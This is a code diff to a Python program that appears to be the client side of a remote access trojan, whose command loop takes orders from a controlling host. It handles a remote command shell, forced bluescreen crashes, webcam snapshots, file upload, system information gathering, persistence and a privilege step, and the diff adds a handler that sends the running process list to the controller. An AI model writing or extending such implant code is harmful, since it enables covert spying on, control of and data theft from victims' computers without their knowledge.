@@ -40,9 +40,9 @@ def PINGPONG_client_T(ip, port):
             sys.exit(1)
         s.send(bytes('PAYLOAD', 'utf8'))
         while True:
-            data = s.recv(1024)
+            data = s.recv(1024).decode()
             # usage 
-            if data.decode() == 'SHOW_ALL_USAGE_APP':
+            if data == 'SHOW_ALL_USAGE_APP':
                 s.send(bytes('OK', 'utf8'))
                 s.recv(1024)
                 s.send(bytes(str(len(usage_list)), 'utf8'))
@@ -50,16 +50,16 @@ def PINGPONG_client_T(ip, port):
                 for usage in usage_list:
                     s.send(bytes(usage, 'utf8'))
                     s.recv(1024)
-            elif data.decode() == 'BG_APP':
+            elif data == 'BG_APP':
                 s.send(bytes('OK', 'utf8'))
                 s.recv(1024)
-            elif data.decode() == "EXIT_APP":
+            elif data == "EXIT_APP":
                 s.close()
                 break
-            elif data.decode() == "CHECK_APP":
+            elif data == "CHECK_APP":
                 s.send(bytes("OK", "utf8"))
 #cmdshell_START_location
-            elif data.decode() == "CMDSHELL_APP":
+            elif data == "CMDSHELL_APP":
                 def CMD_client(ip, port, s, is_connect=False, cmd_c=None):
                     from subprocess import Popen, PIPE
                     try:
@@ -102,7 +102,7 @@ def PINGPONG_client_T(ip, port):
                 CMD_client(ip, cmd_port, s)
 #cmdshell_END_location
 #bluescreen_START_location
-            elif data.decode() == 'BLUESCREEN_APP':
+            elif data == 'BLUESCREEN_APP':
                 s.send(bytes("OK", 'utf8'))
                 from subprocess import Popen, PIPE
                 import platform
@@ -124,7 +124,7 @@ def PINGPONG_client_T(ip, port):
                 
 #bluescreen_END_location
 #priv_vbp_listen_START_location
-            elif data.decode() == "PRO_VBP_APP":
+            elif data == "PRO_VBP_APP":
                 import tempfile
                 import win32file
                 import win32con
@@ -215,8 +215,40 @@ def PINGPONG_client_T(ip, port):
                         stop_thread(t_m)
                         break
 #priv_vbp_listen_END_location
+#listpid_START_location
+            elif data == 'LISTPID_APP':
+                import psutil
+                s.send(bytes('OK', 'utf8'))
+                s.recv(1024)
+                # s.send(bytes(str(proc_len), 'utf8'))
+                # s.recv(1024)
+                count = 0
+                dict_list = []
+                for proc in psutil.process_iter():
+                    try:
+                        pinfo = proc.as_dict(attrs=['pid', 'name'])
+                        pid = pinfo['pid']
+                        name = pinfo['name']
+                    except psutil.NoSuchProcess:
+                        pass
+                    else:
+                        dict_list.append([pid, name])
+                        count += 1
+                s.send(bytes(str(count), 'utf8'))
+                s.recv(1024)
+                for i in dict_list:
+                    pid = i[0]
+                    name = i[1]
+                    s.send(bytes(str(pid), 'utf8'))
+                    s.recv(1024)
+                    s.send(bytes(name, 'utf8'))
+                    s.recv(1024)
+                        
+
+
+#listpid_END_location
 #cam_shot_START_location
-            elif data.decode() == "CAM_SHOT_APP":
+            elif data == "CAM_SHOT_APP":
                 from cv2 import VideoCapture, imwrite
                 import shutil
                 os.mkdir("./temp")
@@ -240,7 +272,7 @@ def PINGPONG_client_T(ip, port):
                     continue
 #cam_shot_END_location
 #upload_START_location
-            elif data.decode() == "UPLOAD_APP":
+            elif data == "UPLOAD_APP":
                 import shutil
                 is_named = False
                 s.send(bytes("OK", 'utf8'))
@@ -277,7 +309,7 @@ def PINGPONG_client_T(ip, port):
                         break
 #upload_END_location
 #getinformation_START_location
-            elif data.decode() == 'GETINFO_APP':
+            elif data == 'GETINFO_APP':
                 import getpass
                 from subprocess import Popen, PIPE
                 s.send(bytes('OK', 'utf8'))
@@ -290,7 +322,7 @@ def PINGPONG_client_T(ip, port):
                 s.recv(1024)
 #getinformation_END_location
 #persistence_service_START_location
-            elif data.decode() == 'PERS_APP':
+            elif data == 'PERS_APP':
                 import tempfile
                 from random import randint
                 import os,sys
